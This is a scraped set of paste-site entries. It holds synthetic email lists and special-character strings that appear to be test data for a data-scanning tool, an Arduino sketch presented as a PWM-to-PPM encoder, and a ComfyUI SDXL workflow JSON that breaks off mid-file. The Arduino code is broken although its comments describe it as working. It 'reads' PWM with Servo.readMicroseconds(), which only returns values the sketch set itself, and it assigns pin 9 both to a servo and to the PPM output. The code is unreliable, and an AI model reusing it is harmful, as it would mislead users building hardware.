wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
wkEgKY7G,Hashed Email - Full,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:45 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
JCCyXXqF,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:43 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
m4Xez63B,PWM 2 PPM Encoder Code For Arduino [ ELECTRUINO],ahsantahir01,C++,Thursday 13th of July 2023 11:11:37 AM CDT,"//Here's an example code for converting PWM signals from an 8-channel Arduino to PPM (Pulse Position Modulation) output:

// code:- 


#include <Servo.h>

#define CHANNEL_COUNT 8
#define PPM_PIN 9

Servo channels[CHANNEL_COUNT];
unsigned int channelValues[CHANNEL_COUNT];
unsigned long lastChannelUpdate = 0;

void setup() {
  // Initialize serial communication
  Serial.begin(9600);

  // Initialize servo objects
  for (int i = 0; i < CHANNEL_COUNT; i++) {
    channels[i].attach(i + 2); // Servo pins start from digital pin 2
    channelValues[i] = 1500; // Set initial values to center position
  }

  // Configure PPM pin as output
  pinMode(PPM_PIN, OUTPUT);
}

void loop() {
  // Update servo positions
  updateChannels();

  // Generate PPM signal
  generatePPM();
}

void updateChannels() {
  for (int i = 0; i < CHANNEL_COUNT; i++) {
    // Read PWM value from each servo
    channelValues[i] = channels[i].readMicroseconds();
  }
}

void generatePPM() {
  unsigned long currentTime = micros();
  static unsigned long lastPPMUpdate = 0;
  static int currentChannel = 0;

  // Check if it's time to update the PPM signal
  if (currentTime - lastPPMUpdate >= 2000) {
    lastPPMUpdate = currentTime;

    // Start PPM frame
    digitalWrite(PPM_PIN, HIGH);
    delayMicroseconds(300);

    // Send pulse for each channel
    for (int i = 0; i < CHANNEL_COUNT; i++) {
      digitalWrite(PPM_PIN, LOW);
      delayMicroseconds(channelValues[i] - 300);
      digitalWrite(PPM_PIN, HIGH);
      delayMicroseconds(300);
    }

    // End PPM frame
    digitalWrite(PPM_PIN, LOW);
  }
}


//This code assumes that you have connected your servos to digital pins 2 to 9 on your Arduino. You can adjust CHANNEL_COUNT to match the number of servos you have connected. The PPM signal is generated on digital pin 9, but you can change it by modifying the PPM_PIN constant.

//The updateChannels() function reads the PWM values from each servo and stores them in the channelValues array. The generatePPM() function generates the PPM signal by timing the pulse widths based on the stored PWM values. The PPM signal is updated every 2 milliseconds.

//Please note that this code assumes that you have installed the Servo library in your Arduino IDE. You can install it by going to //""Sketch"" -> ""Include Library"" -> ""Servo""."
4MJeVnyH,workflowHD2,Symphoenix,JSON,Thursday 13th of July 2023 10:43:56 AM CDT,"{
  ""last_node_id"": 57,
  ""last_link_id"": 86,
  ""nodes"": [
    {
      ""id"": 6,
      ""type"": ""Reroute"",
      ""pos"": [
        473,
        142
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 19,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 3
        }
      ],
      ""outputs"": [
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            75
          ]
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 9,
      ""type"": ""Reroute"",
      ""pos"": [
        476,
        298
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 24,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 6
        }
      ],
      ""outputs"": [
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""links"": [
            64
          ]
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 8,
      ""type"": ""Reroute"",
      ""pos"": [
        477,
        252
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 23,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 5
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            23,
            25
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 5,
      ""type"": ""Reroute"",
      ""pos"": [
        471,
        100
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 18,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 7
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            26,
            27
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 7,
      ""type"": ""Reroute"",
      ""pos"": [
        475,
        208
      ],
      ""size"": [
        82,
        26
      ],
      ""flags"": {},
      ""order"": 22,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 4
        }
      ],
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            32
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 4,
      ""type"": ""Reroute"",
      ""pos"": [
        469,
        59
      ],
      ""size"": [
        82,
        26
      ],
      ""flags"": {},
      ""order"": 17,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 1
        }
      ],
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            33
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 12,
      ""type"": ""CLIPTextEncodeSDXLRefiner"",
      ""pos"": [
        807,
        586
      ],
      ""size"": {
        ""0"": 226.92648315429688,
        ""1"": 118
      },
      ""flags"": {},
      ""order"": 30,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 25
        },
        {
          ""name"": ""text"",
          ""type"": ""STRING"",
          ""link"": 19,
          ""widget"": {
            ""name"": ""text"",
            ""config"": [
              ""STRING"",
              {
                ""multiline"": true
              }
            ]
          }
        },
        {
          ""name"": ""width"",
          ""type"": ""INT"",
          ""link"": 52,
          ""widget"": {
            ""name"": ""width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        },
        {
          ""name"": ""height"",
          ""type"": ""INT"",
          ""link"": 61,
          ""widget"": {
            ""name"": ""height"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            40
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        6,
        2048,
        2048,
        """"
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 13,
      ""type"": ""CLIPTextEncodeSDXL"",
      ""pos"": [
        807,
        786
      ],
      ""size"": {
        ""0"": 220,
        ""1"": 202
      },
      ""flags"": {},
      ""order"": 26,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 26
        },
        {
          ""name"": ""text_g"",
          ""type"": ""STRING"",
          ""link"": 20,
          ""widget"": {
            ""name"": ""text_g"",
            ""config"": [
              ""STRING"",
              {
                ""multiline"": true,
                ""default"": ""CLIP_G""
              }
            ]
          }
        },
        {
          ""name"": ""text_l"",
          ""type"": ""STRING"",
          ""link"": 21,
          ""widget"": {
            ""name"": ""text_l"",
            ""config"": [
              ""STRING"",
              {
                ""multiline"": true,
                ""default"": ""CLIP_L""
              }
            ]
          }
        },
        {
          ""name"": ""width"",
          ""type"": ""INT"",
          ""link"": 58,
          ""widget"": {
            ""name"": ""width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        },
        {
          ""name"": ""height"",
          ""type"": ""INT"",
          ""link"": 57,
          ""widget"": {
            ""name"": ""height"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        },
        {
          ""name"": ""target_width"",
          ""type"": ""INT"",
          ""link"": 59,
          ""widget"": {
            ""name"": ""target_width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        },
        {
          ""name"": ""target_height"",
          ""type"": ""INT"",
          ""link"": 60,
          ""widget"": {
            ""name"": ""target_height"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            42
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        4096,
        4096,
        0,
        0,
        4096,
        4096,
        ""CLIP_G"",
        ""CLIP_L""
      ],
      ""color"": ""#322"",
      ""bgcolor"": ""#533""
    },
    {
      ""id"": 31,
      ""type"": ""Reroute"",
      ""pos"": [
        1151,
        186
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 37,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 40
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""CONDITIONING"",
          ""links"": [
            41
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 32,
      ""type"": ""Reroute"",
      ""pos"": [
        1186,
        254
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 33,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 42
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""CONDITIONING"",
          ""links"": [
            43
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 30,
      ""type"": ""Reroute"",
      ""pos"": [
        1115,
        115
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 35,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 38
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""CONDITIONING"",
          ""links"": [
            39
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 33,
      ""type"": ""Reroute"",
      ""pos"": [
        1211,
        314
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 36,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 44
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""CONDITIONING"",
          ""links"": [
            45
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 11,
      ""type"": ""CLIPTextEncodeSDXL"",
      ""pos"": [
        807,
        336
      ],
      ""size"": {
        ""0"": 220,
        ""1"": 202
      },
      ""flags"": {},
      ""order"": 28,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 27
        },
        {
          ""name"": ""text_g"",
          ""type"": ""STRING"",
          ""link"": 17,
          ""widget"": {
            ""name"": ""text_g"",
            ""config"": [
              ""STRING"",
              {
                ""multiline"": true,
                ""default"": ""CLIP_G""
              }
            ]
          },
          ""slot_index"": 1
        },
        {
          ""name"": ""text_l"",
          ""type"": ""STRING"",
          ""link"": 73,
          ""widget"": {
            ""name"": ""text_l"",
            ""config"": [
              ""STRING"",
              {
                ""multiline"": true,
                ""default"": ""CLIP_L""
              }
            ]
          },
          ""slot_index"": 2
        },
        {
          ""name"": ""width"",
          ""type"": ""INT"",
          ""link"": 51,
          ""widget"": {
            ""name"": ""width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          },
          ""slot_index"": 3
        },
        {
          ""name"": ""height"",
          ""type"": ""INT"",
          ""link"": 53,
          ""widget"": {
            ""name"": ""height"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        },
        {
          ""name"": ""target_width"",
          ""type"": ""INT"",
          ""link"": 54,
          ""widget"": {
            ""name"": ""target_width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        },
        {
          ""name"": ""target_height"",
          ""type"": ""INT"",
          ""link"": 55,
          ""widget"": {
            ""name"": ""target_height"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            38
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        4096,
        4096,
        0,
        0,
        4096,
        4096,
        ""CLIP_G"",
        ""CLIP_L""
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 40,
      ""type"": ""PrimitiveNode"",
      ""pos"": [
        0,
        1300
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 82
      },
      ""flags"": {},
      ""order"": 0,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""INT"",
          ""type"": ""INT"",
          ""links"": [
            52,
            61,
            62,
            63
          ],
          ""widget"": {
            ""name"": ""width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          },
          ""slot_index"": 0
        }
      ],
      ""title"": ""REFINER Conditional Size"",
      ""properties"": {},
      ""widgets_values"": [
        2048,
        ""fixed""
      ],
      ""color"": ""#222"",
      ""bgcolor"": ""#000""
    },
    {
      ""id"": 39,
      ""type"": ""PrimitiveNode"",
      ""pos"": [
        0,
        1150
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 82
      },
      ""flags"": {},
      ""order"": 1,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""INT"",
          ""type"": ""INT"",
          ""links"": [
            51,
            53,
            54,
            55,
            57,
            58,
            59,
            60
          ],
          ""widget"": {
            ""name"": ""width"",
            ""config"": [
              ""INT"",
              {
                ""default"": 1024,
                ""min"": 0,
                ""max"": 8192
              }
            ]
          },
          ""slot_index"": 0
        }
      ],
      ""title"": ""BASE Conditional Size"",
      ""properties"": {},
      ""widgets_values"": [
        4096,
        ""fixed""
      ],
      ""color"": ""#222"",
      ""bgcolor"": ""#000""
    },
    {
      ""id"": 41,
      ""type"": ""Reroute"",
      ""pos"": [
        750,
        0
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 31,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 64
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""VAE"",
          ""links"": [
            65
          ]
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 43,
      ""type"": ""VAEDecode"",
      ""pos"": [
        2400,
        50
      ],
      ""size"": {
        ""0"": 210,
        ""1"": 46
      },
      ""flags"": {},
      ""order"": 41,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""samples"",
          ""type"": ""LATENT"",
          ""link"": 66
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": 67
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            68
          ],
          ""shape"": 3
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      }
    },
    {
      ""id"": 42,
      ""type"": ""Reroute"",
      ""pos"": [
        2250,
        0
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 38,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 65
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""VAE"",
          ""links"": [
            67
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 46,
      ""type"": ""Reroute"",
      ""pos"": [
        1800,
        400
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 43,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 69,
          ""pos"": [
            37.5,
            0
          ]
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""IMAGE"",
          ""links"": [
            70
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": true
      }
    },
    {
      ""id"": 21,
      ""type"": ""SeargePromptText"",
      ""pos"": [
        0,
        650
      ],
      ""size"": {
        ""0"": 403,
        ""1"": 146
      },
      ""flags"": {},
      ""order"": 2,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""STRING"",
          ""type"": ""STRING"",
          ""links"": [
            73
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""title"": ""Secondary Prompt"",
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        ""fibonacci numbers, aesthetic, realistic, sharp""
      ],
      ""color"": ""#233"",
      ""bgcolor"": ""#355""
    },
    {
      ""id"": 25,
      ""type"": ""Reroute"",
      ""pos"": [
        450,
        800
      ],
      ""size"": [
        90.4,
        26
      ],
      ""flags"": {},
      ""order"": 16,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 16
        }
      ],
      ""outputs"": [
        {
          ""name"": ""STRING"",
          ""type"": ""STRING"",
          ""links"": [
            20,
            21,
            22
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 23,
      ""type"": ""Reroute"",
      ""pos"": [
        450,
        400
      ],
      ""size"": [
        90.4,
        26
      ],
      ""flags"": {},
      ""order"": 21,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 14
        }
      ],
      ""outputs"": [
        {
          ""name"": ""STRING"",
          ""type"": ""STRING"",
          ""links"": [
            17,
            19
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": true,
        ""horizontal"": false
      }
    },
    {
      ""id"": 22,
      ""type"": ""SeargePromptText"",
      ""pos"": [
        0,
        850
      ],
      ""size"": {
        ""0"": 403,
        ""1"": 146
      },
      ""flags"": {},
      ""order"": 3,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""STRING"",
          ""type"": ""STRING"",
          ""links"": [
            16
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""title"": ""Negative Prompt"",
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      },
      ""widgets_values"": [
        ""bad quality, text, unpretty, ugly, soft, imprecision""
      ],
      ""color"": ""#322"",
      ""bgcolor"": ""#533""
    },
    {
      ""id"": 49,
      ""type"": ""Reroute"",
      ""pos"": [
        650,
        -200
      ],
      ""size"": [
        75,
        26
      ],
      ""flags"": {},
      ""order"": 27,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": """",
          ""type"": ""*"",
          ""link"": 75
        }
      ],
      ""outputs"": [
        {
          ""name"": """",
          ""type"": ""VAE"",
          ""links"": [
            76
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""showOutputText"": false,
        ""horizontal"": false
      }
    },
    {
      ""id"": 48,
      ""type"": ""VAEEncode"",
      ""pos"": [
        1200,
        -200
      ],
      ""size"": {
        ""0"": 300,
        ""1"": 50
      },
      ""flags"": {},
      ""order"": 34,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""pixels"",
          ""type"": ""IMAGE"",
          ""link"": 79
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": 76
        }
      ],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            74
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Searge SDXL Workflow""
      }
    },
    {
